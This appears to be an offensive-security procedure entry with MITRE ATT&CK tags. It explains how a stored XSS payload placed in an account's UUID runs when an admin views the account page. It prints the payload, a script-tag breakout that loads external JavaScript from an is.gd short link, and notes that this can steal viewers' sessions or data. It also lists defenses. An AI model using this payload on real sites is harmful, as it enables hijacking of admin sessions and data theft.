---
id: proc-trigger-xss-view
tags:
  - xss-execution
  - javascript-injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:30:58.097Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Trigger-Stored-XSS-by-Viewing-Account

## Summary

This procedure demonstrates how the stored XSS payload executes when the affected account's UUID is rendered in a JavaScript context, such as in admin panels or account detail views.

## Description

The malicious UUID is embedded in the page's JavaScript (e.g., YUI.namespace('Env.DATA').consumer = {"uuid":"</script><script src=//is.gd/z0i2sU>"...}), causing the browser to load and run the external script. This leads to arbitrary JS execution, potentially stealing sessions or data from viewers including admins.

## Requirements

1. Authenticated access to view account details (e.g., as admin)
2. Active account with stored payload
3. Browser with dev tools for monitoring

## Defense

Defensive measures and detection strategies:

- Escape all outputs in JS contexts
- Implement Content Security Policy (CSP) to block external scripts
- Audit UUID rendering in admin interfaces

## Objectives

1. Execute injected JavaScript on page load
2. Demonstrate impact like alerts or data exfil
3. Highlight risks to authenticated users

## Instructions

### Step 1: Navigate to Account View

**Context**: As an admin, access the page displaying the UUID, such as /admin/accounts or similar endpoint.

Load the page in a browser targeting the affected brand/account.

### Step 2: Observe Execution

**Context**: Inspect the page source or network tab to confirm payload injection and external script load.

The HTML will show the unescaped UUID in script: YUI.namespace('Env.DATA').consumer = {"uuid":"</script><script src=//is.gd/z0i2sU>"}. Execution happens automatically.

> Expected: Script from is.gd loads; payload effects (e.g., alert) trigger if defined in the external JS.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss-execution
- javascript
